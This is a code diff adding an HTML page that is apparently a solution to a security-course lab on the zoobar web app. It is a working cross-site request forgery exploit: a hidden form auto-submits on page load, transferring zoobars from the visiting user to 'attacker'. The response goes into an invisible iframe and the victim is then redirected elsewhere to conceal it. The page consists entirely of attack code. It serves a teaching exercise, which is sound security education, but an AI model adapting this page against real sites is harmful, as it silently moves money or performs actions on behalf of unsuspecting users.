@@ -1,0 +1,20 @@
+<base target="_self" href="http://localhost:8080/zoobar/index.cgi/transfer">
+
+<iframe name="frame" id="42" src="_self" style="visibility:hidden;height=0;width=0;"> </iframe>
+
+<form target="frame" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+<p hidden>Send <input name="zoobars" type="text" value="10"  size=5> zoobars</p>
+<p hidden>to <input name=recipient type=text value="attacker" size=10></p>
+<input type="submit" name="submission" value="Send" style="visibility:hidden;">
+</form>
+
+<script type="text/javascript">
+function fun() {
+  window.location.replace("http://css.csail.mit.edu/6.858/2015/");
+}
+
+var g = document.getElementById("42");
+g.addEventListener("load", fun, false);
+document.forms[0].submit();
+
+</script>
